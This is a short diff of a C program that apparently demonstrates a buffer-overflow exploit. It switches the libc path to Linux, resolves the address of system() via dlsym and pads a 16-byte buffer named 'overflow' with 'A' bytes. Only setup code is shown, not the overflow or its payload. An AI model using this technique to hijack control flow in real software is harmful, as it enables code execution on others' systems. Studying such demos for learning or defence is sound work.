@@ -9,7 +9,7 @@ int main(int argc, char **argv) {
 
    unsigned char *overflow = malloc(16);
 
-   void *handle = dlopen("/usr/lib/libc.dylib", RTLD_LOCAL | RTLD_LAZY);//dlopen("/lib/libc.so.6", RTLD_LOCAL | RTLD_LAZY);
+   void *handle = dlopen("/lib/libc.so.6", RTLD_LOCAL | RTLD_LAZY);
    int FUNC_ADDR = (int)dlsym(handle, "system");//0x4d2a5e60;
 
    memset(overflow, 0x41, 12);
